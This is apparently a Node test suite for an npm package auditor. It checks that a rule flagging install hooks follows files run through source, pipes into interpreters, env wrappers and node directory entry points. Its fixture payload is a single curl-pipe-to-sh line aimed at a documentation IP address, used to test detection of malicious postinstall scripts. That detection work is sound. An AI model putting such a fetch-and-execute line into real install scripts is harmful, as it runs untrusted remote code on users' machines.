import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { runRules } from "../src/index.js";
import type { AuditInput, PackageFile } from "../src/types.js";

// install-scripts follows files run through `.`/`source`, pipes into an interpreter, pathed wrappers,
// TypeScript runners and Node's directory entry point.

const CURL_SH = "curl -s http://198.51.100.1/x | sh"; // RFC 5737 documentation address
const PAYLOAD = `${CURL_SH}\n`;
const BENIGN = "echo hello\n";

function file(path: string, content: string): PackageFile {
  return { path, content, size: Buffer.byteLength(content), changed: false };
}
function inputFor(files: Record<string, string>, pkgJson: object): AuditInput {
  const list = Object.entries(files).map(([p, c]) => file(p, c));
  list.push(file("package/package.json", JSON.stringify(pkgJson)));
  return {
    meta: {
      name: "probe", version: "1.0.0", author: null, maintainers: [], license: null,
      hasInstallScripts: false, signature: "unknown", provenance: "unknown", integrity: null,
      unpackedSize: 0, fileCount: list.length,
    },
    files: list,
    mode: "full",
  };
}
const sev = (hook: string, files: Record<string, string>, pkg: object = {}) =>
  runRules(inputFor(files, { ...pkg, scripts: { postinstall: hook } })).filter((x) => x.ruleId === "install-scripts").map((x) => x.severity);

/** `hook` is critical when `path` holds the payload and low when it holds a benign file. */
function row(label: string, hook: string, path: string, extra: Record<string, string> = {}, pkg: object = {}) {
  test(`${label}: \`${hook}\``, () => {
    assert.deepEqual(sev(hook, { ...extra, [path]: PAYLOAD }, pkg), ["critical"]);
    assert.deepEqual(sev(hook, { ...extra, [path]: BENIGN }, pkg), ["low"]);
  });
}

describe("install hooks follow the files these forms execute", () => {
  row("dot builtin", ". ./setup", "package/setup");
  row("source builtin", "source setup", "package/setup");
  row("pipe into sh", "cat setup | sh", "package/setup");
  row("pipe into node", "cat setup | node", "package/setup");
  row("pipe into an interpreter after other stages", "cat setup | tr a b | bash", "package/setup");
  row("pathed env wrapper", "/usr/bin/env node setup", "package/setup.js");
  row("pathed env wrapper with a flag", "/usr/bin/env -i node setup", "package/setup.js");
  row("tsx", "tsx setup", "package/setup.ts");
  row("ts-node", "ts-node setup", "package/setup.ts");
  row("bun with a .ts file", "bun setup.ts", "package/setup.ts");
  row(".mts operand", "node --import tsx setup.mts", "package/setup.mts");
  row(".cts operand", "tsx run.cts", "package/run.cts");
  row("node . uses package.json main", "node .", "package/lib/start.js", {}, { main: "lib/start.js" });
  row("node . falls back to index.js", "node .", "package/index.js");
  row("node <dir> uses its package.json main", "node tool", "package/tool/entry.js", { "package/tool/package.json": '{"main":"entry.js"}' });
  row("node <dir> falls back to index.js", "node tool", "package/tool/index.js");

  row("pipe into sudo sh", "cat setup | sudo sh", "package/setup");
  row("pipe-and into sh", "cat setup |& sh", "package/setup");
  row("newline continues a pipeline", "cat setup |\nsh", "package/setup");
  row("dotted directory name", "node tools.v2", "package/tools.v2/index.js");

  row("newline after |& continues a pipeline", "cat setup |&\nsh", "package/setup");

  test("an escaped pipe is not a pipe, so the newline after it separates commands", () => {
    assert.deepEqual(sev("cat setup \\|\nsh", { "package/setup": PAYLOAD }), ["low"]);
  });

  test("a package-local wrapper is scanned and still acts as a wrapper", () => {
    // payload in the extension-less operand of the wrapped interpreter, benign wrapper file
    assert.deepEqual(sev("./bin/env node evil", { "package/bin/env": BENIGN, "package/evil": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("./bin/env node evil", { "package/bin/env": BENIGN, "package/evil": BENIGN }), ["low"]);
    assert.deepEqual(sev("./bin/env setup", { "package/bin/env": PAYLOAD, "package/setup.js": BENIGN }), ["critical"]);
    assert.deepEqual(sev("./bin/node evil", { "package/bin/node": BENIGN, "package/evil": PAYLOAD }), ["critical"]);
  });

  test("a dotted directory entry does not hide a nested file the suffix lookup finds", () => {
    const dir = { "package/tools.v2/index.js": BENIGN };
    assert.deepEqual(sev("cd scripts && node tools.v2", { ...dir, "package/scripts/tools.v2": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("cd scripts && node tools.v2", { ...dir, "package/scripts/tools.v2": BENIGN }), ["low"]);
    assert.deepEqual(sev("node tools.v2", { "package/tools.v2/index.js": PAYLOAD, "package/scripts/tools.v2": BENIGN }), ["critical"]);
  });

  test("a package-local command word is a package file, not env/node", () => {
    assert.deepEqual(sev("./bin/env setup", { "package/bin/env": PAYLOAD, "package/setup.js": BENIGN }), ["critical"]);
    assert.deepEqual(sev("bin/node setup", { "package/bin/node": PAYLOAD, "package/setup.js": BENIGN }), ["critical"]);
    assert.deepEqual(sev("./env setup", { "package/env": PAYLOAD, "package/setup.js": BENIGN }), ["critical"]);
    assert.deepEqual(sev("./bin/env setup", { "package/bin/env": BENIGN, "package/setup.js": BENIGN }), ["low"]);
    // an unresolved or absolute path is still a wrapper, so the operand is scanned
    assert.deepEqual(sev("/usr/bin/env node setup", { "package/setup.js": PAYLOAD }), ["critical"]);
    assert.deepEqual(sev("./bin/env node setup", { "package/setup.js": PAYLOAD }), ["critical"]);
  });

  test("only stages upstream of an interpreter are followed", () => {
    const report = { "package/build.js": BENIGN, "package/build-report.md": `${CURL_SH}\n` };
    assert.deepEqual(sev("node build.js | tee build-report.md", report), ["low"]);
    assert.deepEqual(sev("cat setup | sh | tee build-report.md", { "package/setup": BENIGN, ...report }), ["low"]);
  });

  test("many directory references stay cheap even with a huge `main`", () => {
    const pkg = { main: `${"a".repeat(200000)}.js` };
    const t0 = performance.now();
    assert.deepEqual(sev(`cat ${". ".repeat(50000)}| sh`, { "package/index.js": BENIGN }, pkg), ["low"]);
    const ms = performance.now() - t0;
    assert.ok(ms < 1000, `took ${ms} ms`);
  });

  test("a pipeline with no interpreter does not execute its operands", () => {
    assert.deepEqual(sev("cat setup | wc -l", { "package/setup": PAYLOAD }), ["low"]);
  });

  test("a pipeline operand that names no package file resolves nothing", () => {
    assert.deepEqual(sev("echo hi | sh", { "package/setup": PAYLOAD }), ["low"]);
  });
});
